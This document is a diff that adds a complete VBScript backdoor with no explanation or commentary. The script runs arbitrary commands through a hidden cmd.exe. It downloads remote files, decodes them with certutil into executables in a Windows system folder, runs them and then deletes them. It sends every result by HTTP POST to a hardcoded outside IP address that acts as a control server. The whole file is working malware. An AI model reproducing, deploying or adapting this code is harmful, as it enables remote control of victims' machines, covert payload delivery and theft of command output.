@@ -1,0 +1,96 @@
+Set args = Wscript.Arguments
+Dim arg0: arg0 = Wscript.Arguments.Item(0)
+Dim sUrl: sUrl = "http://93.190.137.212/Hello"
+Dim arg1: arg1 = ""
+Dim arg2: arg2= ""
+Dim result: result = ""
+if (arg0 ="-e") Then
+  arg1 = Wscript.Arguments.Item(1)  
+  arg1 = Replace(arg1, "|", """")
+  result = ExecFunc(arg1, "")
+elseif (arg0 = "-de") Then
+  arg1 = Wscript.Arguments.Item(1)
+  arg2 = ""
+  If (Wscript.Arguments.Count=3) Then
+     arg2 = Wscript.Arguments.Item(2)
+     arg2 = Replace(arg2, "|", """")
+  End If  
+  value = Dl(arg1)
+  dest = Decode(value)
+  result = ExecFunc(dest, arg2)
+  DelFile dest
+elseif (arg0 = "-dump") Then
+  url = Wscript.Arguments.Item(1)
+  result = Dump(url)
+else
+  result = "Error: Invalid arguments"
+end if
+sRequest = "varname=" + result
+HTTPPost sUrl, sRequest
+Function Decode(source)
+  dest = CStr(GetTemp) + "\~DE" + CStr(Rand) + ".exe"
+  decode = "certutil -decode " + source + " " + dest  
+  ExecFunc Decode, ""
+  Wscript.Sleep(2000)
+  DelFile(source)
+  Decode = dest
+End Function
+Function GetTemp()
+  GetTemp = "c:\WINDOWS\addins"
+End Function
+Function Rand()
+  Randomize
+  rand = Int((30000-1+10000)*Rnd+10000)
+  Rand = rand
+End Function
+Function Dump(url)
+  path = Dl(url)
+  Dump = Decode(path)
+End Function
+Function Dl(url)
+  path = CStr(GetTemp) + "\~DF" + CStr(Rand) + ".tmp"
+  dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+  dim bStrm: Set bStrm = createobject("Adodb.Stream")
+  xHttp.Open "GET", url, False
+  xHttp.Send
+  with bStrm
+      .type = 1
+      .open
+      .write xHttp.responseBody
+      .savetofile path, 2
+  end with
+  Dl = path
+End Function
+Function DelFile(path)
+  Set fso = CreateObject("Scripting.FileSystemObject")
+  if fso.FileExists(path) then
+     fso.DeleteFile(path)
+  end if
+End Function
+Function ExecFunc(arg, arg2)
+  On Error Resume Next
+  strText = "None"
+  Set oShell = WScript.CreateObject ("WScript.Shell")
+  outfile = CStr(GetTemp) + "\~DF" + CStr(Rand) + ".tmp"
+  If (arg2<>"") Then
+	cmd = "cmd.exe /c " + arg + " " + arg2 + " >" + outfile +" 2>&1"
+  Else
+    cmd = "cmd.exe /c " + arg + " >" + outfile +" 2>&1"	
+  End If
+  oShell.Run cmd, 0, True
+  Set fso  = CreateObject("Scripting.FileSystemObject")
+  Set file = fso.OpenTextFile(outfile, 1)
+  strText = file.ReadAll
+  file.Close
+  On Error goto 0
+  DelFile outfile
+  ExecFunc = strText
+End Function
+Function HTTPPost(sUrl, sRequest)
+  set oHTTP = CreateObject("Microsoft.XMLHTTP")
+  oHTTP.open "POST", sUrl,false
+  oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+  oHTTP.setRequestHeader "Content-Length", Len(sRequest)
+  oHTTP.send sRequest
+  HTTPPost = oHTTP.responseText
+End Function
